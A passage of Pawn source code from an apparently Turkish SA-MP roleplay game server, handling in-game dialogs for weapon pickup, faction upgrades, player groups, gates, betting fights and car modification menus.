		        case 11: silahisim1 = "Küçük Beyaz Vibrator";
		        case 12: silahisim1 = "Büyük Beyaz Vibrator";
		        case 13: silahisim1 = "Gümüþ Vibrator";
		        case 14: silahisim1 = "Çiçek Demeti";
		        case 15: silahisim1 = "Baston";
		        case 16: silahisim1 = "El Bombasý";
		        case 17: silahisim1 = "Sis Bombasý";
		        case 18: silahisim1 = "Molotof";
		        case 22: silahisim1 = "Pistol";
		        case 23: silahisim1 = "Susturuculu Pistol";
		        case 24: silahisim1 = "Desert Eagle";
		        case 25: silahisim1 = "Shotgun";
		        case 26: silahisim1 = "Sawn-off Shotgun";
		        case 27: silahisim1 = "Combat Shotgun";
		        case 28: silahisim1 = "Micro SMG";
		        case 29: silahisim1 = "Mp5";
		        case 30: silahisim1 = "AK47";
		        case 31: silahisim1 = "M4";
		        case 32: silahisim1 = "Tec9";
		        case 33: silahisim1 = "Country Rifle";
		        case 34: silahisim1 = "Sniper Rifle";
		        case 35: silahisim1 = "Rocket Launcher";
		        case 36: silahisim1 = "HS Rocket Launcher";
		        case 37: silahisim1 = "Flamethrower";
		        case 38: silahisim1 = "Minigun";
		        case 39: silahisim1 = "Satchel Charge";
		        case 41: silahisim1 = "Spraycan";
		        case 42: silahisim1 = "Yangýn Söndürücü Tüp";
		        case 43: silahisim1 = "Kamera";
		        case 46: silahisim1 = "Paraþüt";
			}
			new query2[256];
			format(query2, sizeof(query2), "%d idli araçtan %s isimli silahý ve %d adet silah mermisini aldýnýz.",silahalev[playerid],silahisim1,OyuncuSilah[_id][mermi]);
			Bilgi(playerid, query2);
			format(query2, sizeof(query2), "{a2dab1}%s {c2a2da}model silahý araçtan alýr.", silahisim1);
			MeGonder(playerid, 30.0, query2);
			format(query2, sizeof(query2), "[SILAH LOG] %d nolu silahi %d idli aractan aldi.",OyuncuSilah[_id][no],silahalev[playerid]);
			Log(playerid, query2);
			OyuncuSilah[_id][oyuncuid] = Karakter[playerid][sqlid];
			OyuncuSilah[_id][durum] = 1;
			OyuncuSilahKaydetEx(_id);
			silahalev[playerid] = 0;
		}
		return 1;
	}
	if(dialogid == 235)
	{
	    if(response)
	    {
			if(Karakter[playerid][rutbe] > 1) return FactMenu(playerid);
	        if(listitem == 4)
	        {
	            switch(FEngel[Karakter[playerid][birlik]])
	    		{
					case 0:
					{
					    Bilgi(playerid, "OOC Faction kanalýný kapattýnýz. ''/f(action)''");
					    FEngel[Karakter[playerid][birlik]] = 1;
					}
					case 1:
					{
					    Bilgi(playerid, "OOC Faction kanalýný açtýnýz. ''/f(action)''");
					    FEngel[Karakter[playerid][birlik]] = 0;
					}
		   		}
		   		FactMenu(playerid);
	        }
	        else if(listitem == 5)
	        {
				ShowPlayerDialog(playerid, 426, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Birlik Banka No", "Birliðin banka no'sunu girin\n"C2"(Reklamdan kazanýlan paralar bu banka no'ya yatýrýlacaktýr):", "Gir", "Ýptal");
	        }
	        else if(listitem == 6)
	        {
	            if(Birlik[Karakter[playerid][birlik]][ftip] == CETE) {
					switch(Birlik[Karakter[playerid][birlik]][seviye]) {
					    case 1: {
					        if(KarakterOzellik[playerid][Liderlik] < 7) return Hata(playerid, "Birliðinizi 2 yýldýz yapmak için liderlik özelliðinizin 7. seviye olmasý gerekiyor.");
							if(GetPlayerCash(playerid) < FactionStars[0][Star2Cost]) return Hata(playerid, "Yeterli paranýz yok.");
							if(SQLGetFactionUsers(Birlik[Karakter[playerid][birlik]][sqlid]) < FactionStars[0][Star2User]) return Hata(playerid, "Birliðinizde yeterli sayýda üye yok.");
							GivePlayerCash(playerid, -FactionStars[0][Star2Cost]);
							Bilgi(playerid, "Birliðinizi 2 yýldýza yükselttiniz.");
                            Birlik[Karakter[playerid][birlik]][seviye] = 2;
                            BirlikKaydet(Karakter[playerid][birlik]);
						}
					    case 2: {
					    	if(KarakterOzellik[playerid][Liderlik] < 10) return Hata(playerid, "Birliðinizi 3 yýldýz yapmak için liderlik özelliðinizin 10. seviye olmasý gerekiyor.");
							if(GetPlayerCash(playerid) < FactionStars[0][Star3Cost]) return Hata(playerid, "Yeterli paranýz yok.");
							if(SQLGetFactionUsers(Birlik[Karakter[playerid][birlik]][sqlid]) < FactionStars[0][Star3User]) return Hata(playerid, "Birliðinizde yeterli sayýda üye yok.");
							if(Birlik[Karakter[playerid][birlik]][itibar] < 50) return Hata(playerid, "Ýtibarýnýz en az 50% olmalýdýr.");
							GivePlayerCash(playerid, -FactionStars[0][Star3Cost]);
							Bilgi(playerid, "Birliðinizi 3 yýldýza yükselttiniz.");
                            Birlik[Karakter[playerid][birlik]][seviye] = 3;
                            BirlikKaydet(Karakter[playerid][birlik]);
						}
						case 3: {
						    if(KarakterOzellik[playerid][Liderlik] < 14) return Hata(playerid, "Birliðinizi 4 yýldýz yapmak için liderlik özelliðinizin 14. seviye olmasý gerekiyor.");
							if(GetPlayerCash(playerid) < FactionStars[0][Star4Cost]) return Hata(playerid, "Yeterli paranýz yok.");
							if(SQLGetFactionUsers(Birlik[Karakter[playerid][birlik]][sqlid]) < FactionStars[0][Star4User]) return Hata(playerid, "Birliðinizde yeterli sayýda üye yok.");
							GivePlayerCash(playerid, -FactionStars[0][Star4Cost]);
							Bilgi(playerid, "Birliðinizi 4 yýldýza yükselttiniz.");
                            Birlik[Karakter[playerid][birlik]][seviye] = 4;
                            BirlikKaydet(Karakter[playerid][birlik]);
						}
						case 4: {
						    if(KarakterOzellik[playerid][Liderlik] < 19) return Hata(playerid, "Birliðinizi 5 yýldýz yapmak için liderlik özelliðinizin 19. seviye olmasý gerekiyor.");
							if(GetPlayerCash(playerid) < FactionStars[0][Star5Cost]) return Hata(playerid, "Yeterli paranýz yok.");
							if(SQLGetFactionUsers(Birlik[Karakter[playerid][birlik]][sqlid]) < FactionStars[0][Star5User]) return Hata(playerid, "Birliðinizde yeterli sayýda üye yok.");
							GivePlayerCash(playerid, -FactionStars[0][Star5Cost]);
							Bilgi(playerid, "Birliðinizi 5 yýldýza yükselttiniz.");
                            Birlik[Karakter[playerid][birlik]][seviye] = 5;
                            BirlikKaydet(Karakter[playerid][birlik]);
						}
						case 5: {
							return Hata(playerid, "Birliðinizin yýldýnýzý daha fazla arttýramazsýnýz.");
						}
					}
				}
				else if(Birlik[Karakter[playerid][birlik]][ftip] == MC) {
					switch(Birlik[Karakter[playerid][birlik]][seviye]) {
					    case 1: {
					        if(KarakterOzellik[playerid][Liderlik] < 7) return Hata(playerid, "Birliðinizi 2 yýldýz yapmak için liderlik özelliðinizin 7. seviye olmasý gerekiyor.");
							if(GetPlayerCash(playerid) < FactionStars[0][Star2Cost]) return Hata(playerid, "Yeterli paranýz yok.");
							if(SQLGetFactionUsers(Birlik[Karakter[playerid][birlik]][sqlid]) < FactionStars[0][Star2User]) return Hata(playerid, "Birliðinizde yeterli sayýda üye yok.");
							GivePlayerCash(playerid, -FactionStars[0][Star2Cost]);
							Bilgi(playerid, "Birliðinizi 2 yýldýza yükselttiniz.");
                            Birlik[Karakter[playerid][birlik]][seviye] = 2;
                            BirlikKaydet(Karakter[playerid][birlik]);
						}
					    case 2: {
					    	if(KarakterOzellik[playerid][Liderlik] < 10) return Hata(playerid, "Birliðinizi 3 yýldýz yapmak için liderlik özelliðinizin 10. seviye olmasý gerekiyor.");
							if(GetPlayerCash(playerid) < FactionStars[0][Star3Cost]) return Hata(playerid, "Yeterli paranýz yok.");
							if(SQLGetFactionUsers(Birlik[Karakter[playerid][birlik]][sqlid]) < FactionStars[0][Star3User]) return Hata(playerid, "Birliðinizde yeterli sayýda üye yok.");
							GivePlayerCash(playerid, -FactionStars[0][Star3Cost]);
							Bilgi(playerid, "Birliðinizi 3 yýldýza yükselttiniz.");
                            Birlik[Karakter[playerid][birlik]][seviye] = 3;
                            BirlikKaydet(Karakter[playerid][birlik]);
						}
						case 3: {
						    if(KarakterOzellik[playerid][Liderlik] < 14) return Hata(playerid, "Birliðinizi 4 yýldýz yapmak için liderlik özelliðinizin 14. seviye olmasý gerekiyor.");
							if(GetPlayerCash(playerid) < FactionStars[0][Star4Cost]) return Hata(playerid, "Yeterli paranýz yok.");
							if(SQLGetFactionUsers(Birlik[Karakter[playerid][birlik]][sqlid]) < FactionStars[0][Star4User]) return Hata(playerid, "Birliðinizde yeterli sayýda üye yok.");
							GivePlayerCash(playerid, -FactionStars[0][Star4Cost]);
							Bilgi(playerid, "Birliðinizi 4 yýldýza yükselttiniz.");
                            Birlik[Karakter[playerid][birlik]][seviye] = 4;
                            BirlikKaydet(Karakter[playerid][birlik]);
						}
						case 4: {
						    if(KarakterOzellik[playerid][Liderlik] < 19) return Hata(playerid, "Birliðinizi 5 yýldýz yapmak için liderlik özelliðinizin 19. seviye olmasý gerekiyor.");
							if(GetPlayerCash(playerid) < FactionStars[0][Star5Cost]) return Hata(playerid, "Yeterli paranýz yok.");
							if(SQLGetFactionUsers(Birlik[Karakter[playerid][birlik]][sqlid]) < FactionStars[0][Star5User]) return Hata(playerid, "Birliðinizde yeterli sayýda üye yok.");
							GivePlayerCash(playerid, -FactionStars[0][Star5Cost]);
							Bilgi(playerid, "Birliðinizi 5 yýldýza yükselttiniz.");
                            Birlik[Karakter[playerid][birlik]][seviye] = 5;
                            BirlikKaydet(Karakter[playerid][birlik]);
						}
						case 5: {
							return Hata(playerid, "Birliðinizin yýldýnýzý daha fazla arttýramazsýnýz.");
						}
					}
				}
				else if(Birlik[Karakter[playerid][birlik]][ftip] == MAFYA) {
					switch(Birlik[Karakter[playerid][birlik]][seviye]) {
					    case 1: {
							if(GetPlayerCash(playerid) < FactionStars[1][Star2Cost]) return Hata(playerid, "Yeterli paranýz yok.");
							if(SQLGetFactionUsers(Birlik[Karakter[playerid][birlik]][sqlid]) < FactionStars[1][Star2User]) return Hata(playerid, "Birliðinizde yeterli sayýda üye yok.");
							GivePlayerCash(playerid, -FactionStars[1][Star2Cost]);
							Bilgi(playerid, "Birliðinizi 2 yýldýza yükselttiniz.");
                            Birlik[Karakter[playerid][birlik]][seviye] = 2;
                            BirlikKaydet(Karakter[playerid][birlik]);
						}
					    case 2: {
							if(GetPlayerCash(playerid) < FactionStars[1][Star3Cost]) return Hata(playerid, "Yeterli paranýz yok.");
							if(SQLGetFactionUsers(Birlik[Karakter[playerid][birlik]][sqlid]) < FactionStars[1][Star3User]) return Hata(playerid, "Birliðinizde yeterli sayýda üye yok.");
							GivePlayerCash(playerid, -FactionStars[1][Star3Cost]);
							Bilgi(playerid, "Birliðinizi 3 yýldýza yükselttiniz.");
                            Birlik[Karakter[playerid][birlik]][seviye] = 3;
                            BirlikKaydet(Karakter[playerid][birlik]);
						}
						case 3: {
							if(GetPlayerCash(playerid) < FactionStars[1][Star4Cost]) return Hata(playerid, "Yeterli paranýz yok.");
							if(SQLGetFactionUsers(Birlik[Karakter[playerid][birlik]][sqlid]) < FactionStars[1][Star4User]) return Hata(playerid, "Birliðinizde yeterli sayýda üye yok.");
							GivePlayerCash(playerid, -FactionStars[1][Star4Cost]);
							Bilgi(playerid, "Birliðinizi 4 yýldýza yükselttiniz.");
                            Birlik[Karakter[playerid][birlik]][seviye] = 4;
                            BirlikKaydet(Karakter[playerid][birlik]);
						}
						case 4: {
							if(GetPlayerCash(playerid) < FactionStars[1][Star5Cost]) return Hata(playerid, "Yeterli paranýz yok.");
							if(SQLGetFactionUsers(Birlik[Karakter[playerid][birlik]][sqlid]) < FactionStars[1][Star5User]) return Hata(playerid, "Birliðinizde yeterli sayýda üye yok.");
							GivePlayerCash(playerid, -FactionStars[1][Star5Cost]);
							Bilgi(playerid, "Birliðinizi 5 yýldýza yükselttiniz.");
                            Birlik[Karakter[playerid][birlik]][seviye] = 5;
                            BirlikKaydet(Karakter[playerid][birlik]);
						}
						case 5: {
							return Hata(playerid, "Birliðinizin yýldýnýzý daha fazla arttýramazsýnýz.");
						}
					}
				}
				else if(Birlik[Karakter[playerid][birlik]][ftip] == YARIS) {
					switch(Birlik[Karakter[playerid][birlik]][seviye]) {
					    case 1: {
							if(GetPlayerCash(playerid) < FactionStars[2][Star2Cost]) return Hata(playerid, "Yeterli paranýz yok.");
							if(SQLGetFactionUsers(Birlik[Karakter[playerid][birlik]][sqlid]) < FactionStars[2][Star2User]) return Hata(playerid, "Birliðinizde yeterli sayýda üye yok.");
							GivePlayerCash(playerid, -FactionStars[2][Star2Cost]);
							Bilgi(playerid, "Birliðinizi 2 yýldýza yükselttiniz.");
                            Birlik[Karakter[playerid][birlik]][seviye] = 2;
                            BirlikKaydet(Karakter[playerid][birlik]);
						}
					    case 2: {
							if(GetPlayerCash(playerid) < FactionStars[2][Star3Cost]) return Hata(playerid, "Yeterli paranýz yok.");
							if(SQLGetFactionUsers(Birlik[Karakter[playerid][birlik]][sqlid]) < FactionStars[2][Star3User]) return Hata(playerid, "Birliðinizde yeterli sayýda üye yok.");
							GivePlayerCash(playerid, -FactionStars[2][Star3Cost]);
							Bilgi(playerid, "Birliðinizi 3 yýldýza yükselttiniz.");
                            Birlik[Karakter[playerid][birlik]][seviye] = 3;
                            BirlikKaydet(Karakter[playerid][birlik]);
						}
						case 3: {
							return Hata(playerid, "Birliðinizin yýldýnýzý daha fazla arttýramazsýnýz.");
						}
					}
				}
				else ShowPlayerDialog(playerid, 427, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Birlik Reklam Fiyat", "Reklamda harf baþýna alýnacak parayý girin:", "Gir", "Ýptal");
			}
	        else
	        {
	            FactMenu(playerid);
	        }
	    }
	    else FactMenu(playerid);
	    return 1;
	}
	if(dialogid == 236)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            ShowPlayerDialog(playerid, 237, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Grup", "Deðiþtirmek istediðiniz grup ismini girin:", "Tamam", "Geri");
	        }
			if(listitem == 1)
			{
			    new mstring[1024];
				foreach(new i : Player)
				{
    				if(Karakter[i][grup] == Karakter[playerid][grup])
					{
    					if(Grup[Karakter[playerid][grup]][lider] == Karakter[i][sqlid]) format(mstring, sizeof(mstring), "%s%s[%d]\tLider\n",mstring,OyuncuAdiniBul(i),i);
    					else format(mstring, sizeof(mstring), "%s%s[%d]\n",mstring,OyuncuAdiniBul(i),i);
					}
				}
				ShowPlayerDialog(playerid, 238, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Grup", mstring, "Seç", "Geri");
			}
			if(listitem == 2)
			{
			    ShowPlayerDialog(playerid, 240, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Grup", "Gruba davet etmek istediðiniz oyuncu idsini girin:", "Tamam", "Geri");
			}
	    }
	    return 1;
	}
	if(dialogid == 237)
	{
	    if(response)
	    {
			if(strlen(inputtext) > 32) return Hata(playerid, "Grubunuzun ismi en fazla 32 karakter olabilir."), ShowPlayerDialog(playerid, 237, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Grup", "Deðiþtirmek istediðiniz grup ismini girin:", "Tamam", "Geri");
			new mstring[256];
			format(mstring, sizeof(mstring), "Grubunuzun ismi %s olarak deðiþmiþtir.", inputtext);
			format(Grup[Karakter[playerid][grup]][gisim], 32, "%s", inputtext);
			GrupKaydet(Karakter[playerid][grup]);
			GrupMenu(playerid);
		}
		else
		{
		    GrupMenu(playerid);
		}
		return 1;
	}
	if(dialogid == 238)
	{
		if(response)
		{
		    new listtid=-1;
			foreach(new i : Player)
			{
			    if(Karakter[playerid][grup] == Karakter[i][grup])
			    {
					listtid++;
					if(listtid != -1 && listitem == listtid)
					{
					    factayarliyo[playerid] = i;
						new mstring[128];
						format(mstring, sizeof(mstring), "{FFFFFF}%s[%d]\nGrup {B3B3B3}Çýkar",OyuncuAdiniBul(i),i);
					    ShowPlayerDialog(playerid, 239, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Grup", mstring, "Tamam", "Geri");
					}
			    }
			}
		}
		else
		{
		    GrupMenu(playerid);
		}
	    return 1;
	}
	if(dialogid == 239)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
				new mstring[128];
				format(mstring, sizeof(mstring), "{FFFFFF}%s[%d]\nGrup {B3B3B3}Çýkar",OyuncuAdiniBul(factayarliyo[playerid]),factayarliyo[playerid]);
				ShowPlayerDialog(playerid, 239, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Grup", mstring, "Tamam", "Geri");
			}
			if(listitem == 1)
			{
			    if(factayarliyo[playerid] == playerid) return factayarliyo[playerid] = 0,Ipucu(playerid, "Grubu silmek istiyorsanýz ''/grup cik''.");
				new mstring[128];
				format(mstring,sizeof(mstring),"%s adlý oyuncuyu gruptan çýkardýnýz.",OyuncuAdiniBul(factayarliyo[playerid]));
				Bilgi(playerid, mstring);
				Karakter[factayarliyo[playerid]][grup] = 0;
			    factayarliyo[playerid] = 0;
			    GrupMenu(playerid);
			}
		}
	    else GrupMenu(playerid),factayarliyo[playerid] = 0;
	    return 1;
	}
	if(dialogid == 240)
	{
	    if(response)
	    {
			new pid;
			pid = strval(inputtext);
			if(!Girdi[pid]) return Hata(playerid, "Belirttiðiniz oyuncu oyuna baðlý deðil.");
			if(Karakter[pid][grup] != 0) return Hata(playerid, "Belirttiðiniz oyuncu baþka bir gruba üye.");
			Bilgi(playerid, "Oyuncuya davet isteði yolladýnýz.");
			SetPVarInt(pid, "DavetEden", playerid);
       		new mstring[256];
       		GrupMenu(playerid);
			format(mstring,sizeof(mstring),"{FFFFFF}%s adlý kiþi sizi %s isimli gruba davet ediyor. Kabul ediyor musunuz?",OyuncuAdiniBul(playerid), Grup[Karakter[playerid][grup]][gisim]);
			ShowPlayerDialog(pid,241,DIALOG_STYLE_MSGBOX,""C7"EIGHTBORN - "C8"Grup",mstring,"Evet","Hayýr");
	    }
	    else GrupMenu(playerid);
	    return 1;
	}
	if(dialogid == 241)
	{
	    if(response)
	    {
	        new davet = GetPVarInt(playerid, "DavetEden");
	        Karakter[playerid][grup] = Karakter[davet][grup];
	        new mstring[170];
	        format(mstring, sizeof(mstring), "%s isimli gruba girdiniz.",Grup[Karakter[playerid][grup]][gisim]);
	        Bilgi(playerid, mstring);
	        format(mstring, sizeof(mstring), "%s adlý oyuncu %s isimli gruba girdi.",OyuncuAdiniBul(playerid), Grup[Karakter[playerid][grup]][gisim]);
	        Bilgi(davet, mstring);
		}
		return 1;
	}
	if(dialogid == 242)
	{
	    //printf("dialog242 - %d",gateduzenle[playerid]);
	    if(response)
	    {
			if(listitem == 0)
			{
			    ShowPlayerDialog(playerid, 243, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Gate", "Deðiþtirmek istediðiniz gate modelini girin:", "Tamam", "Ýptal");
			}
			if(listitem == 1)
			{
			    new id=gateduzenle[playerid];
			    gateduzen[playerid] = 1;
			    EditDynamicObject(playerid, Gate[id][gobje]);
			}
			if(listitem == 2)
			{
			    new id=gateduzenle[playerid];
			    gateduzen[playerid] = 2;
			    EditDynamicObject(playerid, Gate[id][gobje]);
			}
			if(listitem == 3)
			{
			    ShowPlayerDialog(playerid, 244, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Gate", "Gate sahibini belirleyin[SQLID]:", "Tamam", "Ýptal");
			}
			if(listitem == 4)
			{
			    ShowPlayerDialog(playerid, 245, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Gate", "Gate birliðini belirleyin:", "Tamam", "Ýptal");
			}
	    }
	    return 1;
	}
	if(dialogid == 243)
	{
	    //printf("dialog243 - %d",gateduzenle[playerid]);
	    if(response)
	    {
	        new id=gateduzenle[playerid];
	        DestroyDynamicObject(Gate[id][gobje]);
	        Gate[id][gmodel] = strval(inputtext);
	        Gate[id][gobje] = CreateDynamicObject(Gate[id][gmodel], Gate[id][gx],Gate[id][gy],Gate[id][gz],Gate[id][grx],Gate[id][gry],Gate[id][grz], .worldid=Gate[id][gvw], .interiorid=Gate[id][gint]);
	        Gate[id][gdurum] = 0;
	        Bilgi(playerid, "Gate'in modelini deðiþtirdiniz.");
	        GateKaydet(id);
	    }
	    return 1;
	}
	if(dialogid == 244)
	{
	    //printf("dialog244 - %d",gateduzenle[playerid]);
	    if(response)
	    {
	        new mstring[64],id=strval(inputtext),id2=gateduzenle[playerid];
	        Gate[id2][gsahip] = id;
	        Gate[id2][gbirlik] = 255;
	        format(mstring, sizeof(mstring), "Gate sahibini %s olarak deðiþtirdiniz.",SQLFromName(id));
	        Bilgi(playerid, mstring);
	        GateKaydet(id2);
	    }
	    return 1;
	}
	if(dialogid == 245)
	{
	    //printf("dialog245 - %d",gateduzenle[playerid]);
	    if(response)
	    {
	        new mstring[64],id=strval(inputtext),id2=gateduzenle[playerid];
	        Gate[id2][gbirlik] = id;
	        Gate[id2][gsahip] = -1;
	        format(mstring, sizeof(mstring), "Gate birliðini %s olarak deðiþtirdiniz.",Birlik[id][fisim]);
	        Bilgi(playerid, mstring);
	        GateKaydet(id2);
	    }
	    return 1;
	}
	if(dialogid == 246)
	{
	    if(response)
	    {
			switch(listitem)
			{
			    case 0:
			    {
			        ShowPlayerDialog(playerid, 247, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Dövüþ", "Mavi taraftaki oyuncu idsini girin:", "Tamam", "Ýptal");
			        tarafseciyo[playerid] = 1;
			    }
			    case 1:
			    {
			        ShowPlayerDialog(playerid, 247, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Dövüþ", "Kýrmýzý taraftaki oyuncu idsini girin:", "Tamam", "Ýptal");
					tarafseciyo[playerid] = 2;
			    }
				case 2:
				{
				    ShowPlayerDialog(playerid, 254, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Dövüþ", "Dövüþ süresini girin(dakika olarak):", "Tamam", "Ýptal");
				}
				case 3:
			    {
			        if(dovus)
			        {
			            Bilgi(playerid, "Dövüþü bitirdiniz.");
			            DovusBitir();
			        }
			        else if(!dovus)
			        {
                        if(mavitaraf == -1 || kirmizitaraf == -1) return Hata(playerid, "Taraflarý belirlemiþsiniz.");
                        SetPlayerPos(mavitaraf, 2610.2800,-1604.1678,-70.2262);
                        SetPlayerPos(kirmizitaraf, 2614.7124,-1608.1412,-70.2262);
                        SetPlayerHealth(mavitaraf, 100.0);
                        SetPlayerHealth(kirmizitaraf, 100.0);
                        SetPlayerArmour(mavitaraf, 0.0);
                        SetPlayerArmour(kirmizitaraf, 0.0);
                        SetPlayerAttachedObject(kirmizitaraf,7,19556,6,0.011999,-0.006000,0.000000,0.000000,-100.199996,-9.799984,1.000000,1.000000,1.000000);
						SetPlayerAttachedObject(kirmizitaraf,8,19555,5,0.035000,0.010999,0.005000,-16.700012,-99.000007,174.800094,1.000000,1.000000,1.000000);
						SetPlayerAttachedObject(mavitaraf,7,19556,6,0.011999,-0.006000,0.000000,0.000000,-100.199996,-9.799984,1.000000,1.000000,1.000000,0xAA0000FF,0xAA0000FF);
						SetPlayerAttachedObject(mavitaraf,8,19555,5,0.035000,0.010999,0.005000,-16.700012,-99.000007,174.800094,1.000000,1.000000,1.000000,0xAA0000FF,0xAA0000FF);
                        //SetPlayerSkin(mavitaraf, 81);
                        //SetPlayerSkin(kirmizitaraf, 80);
                        DONDUR(mavitaraf);
                        DONDUR(kirmizitaraf);
			            Bilgi(playerid, "Dövüþü baþlattýnýz.");
			            dovus = true;
			            foreach(new i : Player)
						{
						    if(IsPlayerInRangeOfPoint(i, 30, 2612.3662,-1606.3315,-70.2262))
						    {
						        SendClientMessageEx(i, -1, "{B3B3B3}((Dövüþ %f dakika içerisinde baþlýyor, bahislerini yatýrýn..))", dovussure);
						    }
						}
						SetTimer("DovusBasla", floatround(dovussure*60000), false);
			        }
			    }
			}
	    }
	    return 1;
	}
	if(dialogid == 247)
	{
	    if(response)
	    {
		    switch(tarafseciyo[playerid])
			{
			    case 1:
			    {
					new mstring[128],id=strval(inputtext);
					format(mstring, sizeof(mstring), "Mavi tarafý %s olarak belirlediniz.",OyuncuAdiniBul(id));
					Bilgi(playerid, mstring);
					mavitaraf = id;
					tarafseciyo[playerid] = 0;
				}
				case 2:
				{
				    new mstring[128],id=strval(inputtext);
					format(mstring, sizeof(mstring), "Kýrmýzý tarafý %s olarak belirlediniz.",OyuncuAdiniBul(id));
					Bilgi(playerid, mstring);
					kirmizitaraf = id;
					tarafseciyo[playerid] = 0;
				}
			}
		}
		return 1;
	}
	if(dialogid == 248)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
				new mstring[128];
			    format(mstring, sizeof(mstring), "Mavi tarafa[%s] ne kadar bahis yatýrmak istersiniz:\n((Kazanýrsanýz paranýzýn 2 katýný alýcaksýnýz.))",OyuncuAdiniBul(mavitaraf));
			    ShowPlayerDialog(playerid, 249, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Dövüþ", mstring, "Bahis Yatýr", "Ýptal");
			    tarafseciyo[playerid] = 1;
			}
			if(listitem == 1)
			{
			    new mstring[128];
			    format(mstring, sizeof(mstring), "Kýrmýzý tarafa[%s] ne kadar bahis yatýrmak istersiniz:\n((Kazanýrsanýz paranýzýn 2 katýný alýcaksýnýz.))",OyuncuAdiniBul(kirmizitaraf));
			    ShowPlayerDialog(playerid, 249, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Dövüþ", mstring, "Bahis Yatýr", "Ýptal");
			    tarafseciyo[playerid] = 2;
			}
	    }
	    return 1;
	}
	if(dialogid == 249)
	{
	    if(response)
	    {
	        switch(tarafseciyo[playerid])
	        {
				case 1:
				{
				    new mstring[128],bahis=strval(inputtext);
					if(bahis <= 0) return Hata(playerid, "Hatalý miktar girdiniz.");
					if(GetPlayerMoney(playerid) < bahis) return Hata(playerid, "Yeterli paranýz yok.");
					bahistip[playerid] = 1;
					bahispara[playerid] = bahis;
					format(mstring, sizeof(mstring), "Mavi tarafa[%s] %d$ bahis yatýrdýnýz.",OyuncuAdiniBul(mavitaraf), bahis);
					Log(playerid, mstring);
					Bilgi(playerid, mstring);
					tarafseciyo[playerid] = 0;
					GivePlayerCash(playerid, -bahis);
					//BahisParasi += bahis;
				}
				case 2:
				{
					new mstring[128],bahis=strval(inputtext);
					if(bahis <= 0) return Hata(playerid, "Hatalý miktar girdiniz.");
					if(GetPlayerMoney(playerid) < bahis) return Hata(playerid, "Yeterli paranýz yok.");
					bahistip[playerid] = 2;
					bahispara[playerid] = bahis;
					format(mstring, sizeof(mstring), "Kýrmýzý tarafa[%s] %d$ bahis yatýrdýnýz.",OyuncuAdiniBul(kirmizitaraf), bahis);
					Log(playerid, mstring);
					Bilgi(playerid, mstring);
					tarafseciyo[playerid] = 0;
					GivePlayerCash(playerid, -bahis);
					//BahisParasi += bahis;
				}
	        }
	    }
	    return 1;
	}
	if(dialogid == 250)
	{
	    if(response)
	    {
			new mstring[128];
	        new veh = GetPVarInt(playerid, "AracID");
	        new pid = GetPVarInt(playerid, "AracAtan");
	        DeletePVar(playerid, "AracID");
	        DeletePVar(playerid, "AracAtan");
	        format(mstring,sizeof(mstring), "%s adlý oyuncunun teklifini kabul ettiniz.",OyuncuAdiniBul(pid));
	        Bilgi(playerid, mstring);
	        format(mstring,sizeof(mstring), "%s adlý oyuncu teklifinizi kabul etti.",OyuncuAdiniBul(playerid));
	        Bilgi(pid, mstring);
	        PutPlayerInVehicle(playerid, veh, GetAvailableSeat(veh));
	    }
	    else
	    {
	        new mstring[128];
	        new pid = GetPVarInt(playerid, "AracAtan");
	        DeletePVar(playerid, "AracID");
	        DeletePVar(playerid, "AracAtan");
	        format(mstring,sizeof(mstring), "%s adlý oyuncunun teklifini reddettiniz.",OyuncuAdiniBul(pid));
	        Bilgi(playerid, mstring);
	        format(mstring,sizeof(mstring), "%s adlý oyuncu teklifinizi reddetti.",OyuncuAdiniBul(playerid));
	        Bilgi(pid, mstring);
	    }
	    return 1;
	}
	if(dialogid == 251)
	{
	    if(response)
	    {
	        meslekbul[playerid] = 1;
			new listid=-1;
            for(new i;i<MAX_GPS;i++)
	    	{
				if(!isnull(Gps[i][gisim]) && Gps[i][gekleyen] != -1)
				{
				    listid++;
				    if(listid == listitem)
				    {
				        Bilgi(playerid, "GPS'iniz ayarlandý.");
						SetPlayerCheckpoint(playerid,Gps[i][gx],Gps[i][gy],Gps[i][gz],5.0);
						gBuluyor[playerid] = true;
						break;
					}
				}
	   		}

	    }
	    return 1;
	}
	if(dialogid == 252)
	{
	    if(response)
		{
   			if(listitem == 0) { ShowPlayerDialog(playerid, 206+2, DIALOG_STYLE_LIST, "Rüzgarlýklar","Alien Rüzgarlýk\nX-Flow Rüzgarlýk", "Seç", "Geri"); }
			if(listitem == 1) { ShowPlayerDialog(playerid, 206+3, DIALOG_STYLE_LIST, "Çatýlýklar","Alien Çatýlýk\nX-Flow Çatýlýk\nCovertible Çatýlýk [Blade]\nVinyl Hardtop Çatýlýk [Blade]\nHardtop Çatýlýk [Savanna]\nSofttop Çatýlýk [Savanna]", "Seç", "Geri"); }
			if(listitem == 2) { ShowPlayerDialog(playerid, 206+4, DIALOG_STYLE_LIST, "Yan Tamponlar","Alien Yan Tampon\nX-Flow Yan Tampon\nChrome Yan Tampon [Broadway]\nChrome Flames Yan Tampon [Remington]\nChrome Arches Yan Tampon [Remington]\nChrome Strip Yan Tampon [Savanna & Blade & Tornado]\nChrome Trim Yan Tampon [Slamvan]\nWheelcovers Yan Tampon [Slamvan]", "Seç", "Geri"); }
			if(listitem == 3) { ShowPlayerDialog(playerid, 206+5, DIALOG_STYLE_LIST, "Egzozlar","Alien Egsoz\nX-Flow Egsoz\nSlamin Egsoz\nChrome Egsoz", "Seç", "Geri"); }
